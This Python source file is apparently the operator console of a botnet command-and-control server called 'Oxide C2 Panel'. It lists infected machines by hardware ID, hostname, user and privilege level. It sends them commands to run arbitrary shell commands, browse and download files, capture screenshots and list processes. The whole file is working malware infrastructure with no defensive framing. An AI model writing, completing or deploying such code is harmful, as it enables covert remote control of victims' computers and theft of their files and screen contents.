import asyncio
import json
import time
import uuid
from .registry import Registry
from .storage import list_bots, save_command

COMMANDS = {
    "shell": "Execute a shell command",
    "file_list": "List directory contents",
    "file_download": "Download a file",
    "screenshot": "Capture screenshot",
    "process_list": "List running processes",
}


async def run_cli(registry: Registry):
    await asyncio.sleep(1)
    print("\n=== Oxide C2 Panel ===")
    print("Commands: bots, use <hwid>, shell <cmd>, file_list <path>,")
    print("          file_download <path>, screenshot, process_list, quit\n")

    selected_hwid = None

    while True:
        try:
            prompt = f"oxide({selected_hwid[:12] if selected_hwid else 'none'})> "
            line = await asyncio.get_event_loop().run_in_executor(None, lambda: input(prompt))
        except (EOFError, KeyboardInterrupt):
            break

        line = line.strip()
        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()

        if cmd == "quit":
            break
        elif cmd == "bots":
            clients = await registry.list_all()
            if not clients:
                print("No bots connected.")
                continue
            print(f"\n{'HWID':<20} {'Hostname':<15} {'OS':<10} {'User':<12} {'Priv':<6}")
            print("-" * 65)
            for c in clients:
                info = c.info
                print(
                    f"{c.hwid[:18]:<20} {info.get('hostname','?'):<15} "
                    f"{info.get('os','?'):<10} {info.get('username','?'):<12} "
                    f"{info.get('privileges','?'):<6}"
                )
            print()
        elif cmd == "use":
            if len(parts) < 2:
                print("Usage: use <hwid-prefix>")
                continue
            prefix = parts[1]
            clients = await registry.list_all()
            matches = [c for c in clients if c.hwid.startswith(prefix)]
            if len(matches) == 0:
                print(f"No bot matching '{prefix}'")
            elif len(matches) > 1:
                print(f"Ambiguous: {[c.hwid[:16] for c in matches]}")
            else:
                selected_hwid = matches[0].hwid
                print(f"Selected: {selected_hwid}")
        elif cmd in COMMANDS:
            if not selected_hwid:
                print("No bot selected. Use 'bots' then 'use <hwid>'")
                continue
            args = {}
            if cmd == "shell" and len(parts) > 1:
                args = {"command": parts[1]}
            elif cmd == "file_list":
                args = {"path": parts[1] if len(parts) > 1 else "."}
            elif cmd == "file_download" and len(parts) > 1:
                args = {"path": parts[1]}
            elif cmd == "file_download":
                print("Usage: file_download <path>")
                continue
            cmd_id = str(uuid.uuid4())
            packet = {
                "id": cmd_id,
                "seq": 0,
                "timestamp": int(time.time()),
                "type": "command",
                "data": {"command_type": cmd, "args": args},
            }
            await save_command(cmd_id, selected_hwid, cmd, json.dumps(args))
            sent = await registry.send_to(selected_hwid, packet)
            if sent:
                print(f"Command sent (id={cmd_id[:8]}). Watch logs for response.")
            else:
                print(f"Failed to send (bot disconnected?)")
        else:
            print(f"Unknown command: {cmd}. Available: bots, use, {', '.join(COMMANDS)}, quit")
